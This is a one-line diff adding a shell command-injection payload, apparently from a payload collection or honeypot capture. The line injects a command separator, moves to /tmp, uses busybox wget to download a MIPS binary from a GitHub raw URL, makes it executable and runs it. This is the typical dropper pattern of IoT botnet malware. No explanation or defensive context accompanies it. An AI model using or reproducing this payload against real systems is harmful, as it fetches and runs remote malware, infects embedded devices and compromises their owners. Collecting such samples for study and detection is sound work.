@@ -1,0 +1,1 @@
+orf;cd /tmp; rm -rf mpsl; /bin/busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mipsle; chmod +x mipsle; ./mipsle; #
